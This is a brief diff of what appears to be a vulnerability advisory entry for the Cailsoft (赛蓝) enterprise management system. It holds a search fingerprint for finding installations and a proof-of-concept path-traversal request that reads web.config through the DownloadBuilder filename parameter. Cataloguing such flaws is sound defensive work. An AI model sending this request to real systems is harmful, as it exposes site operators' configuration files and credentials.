@@ -8,7 +8,7 @@
 body="www.cailsoft.com" || body="赛蓝企业管理系统"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
